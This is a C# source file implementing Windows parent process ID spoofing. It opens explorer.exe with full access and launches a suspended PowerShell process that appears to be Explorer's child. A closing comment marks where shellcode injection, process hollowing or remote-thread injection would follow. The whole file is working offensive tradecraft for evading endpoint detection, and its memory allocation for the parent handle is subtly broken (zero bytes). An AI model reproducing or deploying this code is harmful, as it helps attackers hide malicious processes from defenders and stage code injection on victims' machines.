using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Linq;

namespace PPIDSpoofing {
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFOEX {
        public STARTUPINFO StartupInfo;
        public IntPtr lpAttributeList;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_ATTRIBUTES {
        public int nLength;
        public IntPtr lpSecurityDescriptor;
        public int bInheritHandle;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [Flags]
    public enum AllocationType {
        Commit = 0x1000,
        Reserve = 0x2000,
        Decommit = 0x4000,
        Release = 0x8000,
        Reset = 0x80000,
        Physical = 0x400000,
        TopDown = 0x100000,
        WriteWatch = 0x200000,
        LargePages = 0x20000000
    }

    [Flags]
    public enum MemoryProtection {
        Execute = 0x10,
        ExecuteRead = 0x20,
        ExecuteReadWrite = 0x40,
        ExecuteWriteCopy = 0x80,
        NoAccess = 0x01,
        ReadOnly = 0x02,
        ReadWrite = 0x04,
        WriteCopy = 0x08,
        GuardModifierflag = 0x100,
        NoCacheModifierflag = 0x200,
        WriteCombineModifierflag = 0x400
    }

    public static class Kernel32 {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(
         UInt32 processAccess,
         bool bInheritHandle,
         int processId);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool InitializeProcThreadAttributeList(
            IntPtr lpAttributeList,
            int dwAttributeCount,
            int dwFlags,
            ref IntPtr lpSize
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool UpdateProcThreadAttribute(
            IntPtr lpAttributeList,
            uint dwFlags,
            int Attribute,
            IntPtr lpValue,
            int cbSize,
            IntPtr lpPreviousValue,
            IntPtr lpReturnSiz
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            ref SECURITY_ATTRIBUTES lpProcessAttributes,
            ref SECURITY_ATTRIBUTES lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            [In] ref STARTUPINFOEX lpStartupInfo,
            ref PROCESS_INFORMATION lpProcessInformation
        );

        [DllImport("kernel32.dll")]
        public static extern bool ProcessIdToSessionId(uint dwProcessId, ref uint pSessionId);

        [DllImport("kernel32.dll")]
        public static extern uint GetCurrentProcessId();

        public class Apex {
            public static void Main(string[] args) {
                // Get the PID of Explorer
                uint[] parentProcessIds = Process.GetProcessesByName("explorer").Select(x => (uint)x.Id).ToArray();

                // Check if the PID is within the current user session
                // If multiple PID returned, check wich one is within the current user session
                uint parentProcessId = 0;
                uint currentPid = GetCurrentProcessId();
                if (parentProcessIds.Length != 1) {
                    foreach (uint pid in parentProcessIds) {
                        parentProcessId = CheckIfWithinSession(pid, currentPid);
                        if (parentProcessId != 0)
                            break;
                    }
                } else
                    parentProcessId = CheckIfWithinSession(parentProcessIds[0], currentPid);
              
                if (parentProcessId == 0)
                    return;

                // Create structures
                STARTUPINFO si = new STARTUPINFO();
                STARTUPINFOEX six = new STARTUPINFOEX();
                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();
                sa.nLength = System.Runtime.InteropServices.Marshal.SizeOf(sa);
                IntPtr lpSize = IntPtr.Zero;
                six.StartupInfo = si;

                // Change the full access to something different: 0x1fffff
                // Open parent process to get the handler
                IntPtr hParentProcess = OpenProcess(0x1fffff, false, (int)parentProcessId);

                // Write the handler of the parent process in memory
                IntPtr lpValue = IntPtr.Zero;
                lpValue = System.Runtime.InteropServices.Marshal.AllocHGlobal(IntPtr.Zero);
                System.Runtime.InteropServices.Marshal.WriteIntPtr(lpValue, hParentProcess);

                InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
                six.lpAttributeList = System.Runtime.InteropServices.Marshal.AllocHGlobal(lpSize);
                InitializeProcThreadAttributeList(six.lpAttributeList, 1, 0, ref lpSize);
                UpdateProcThreadAttribute(six.lpAttributeList, 0, 0x00020000, lpValue, (int)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);

                CreateProcess(
                    @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    null,
                    ref sa,
                    ref sa,
                    false,
                    0x08080004,
                    IntPtr.Zero,
                    null,
                    ref six,
                    ref pi
                );
                
                // inject something here
                //      QueueUserAPC
                //      CreateRemoteThread
                //      PE Injection
                //      Process Hollowing
                //      etc ...
            }

            private static uint CheckIfWithinSession(uint parentPid, uint currentPid) {
                uint processSessionId = 0;
                uint parentSessionId = 0;
                ProcessIdToSessionId(currentPid, ref processSessionId);
                ProcessIdToSessionId(parentPid, ref parentSessionId);

                // If both session ID are same this means that the parrent ID can be used 
                if (processSessionId == parentSessionId)
                    return parentPid;
                return 0;
            }
        }
    }
}
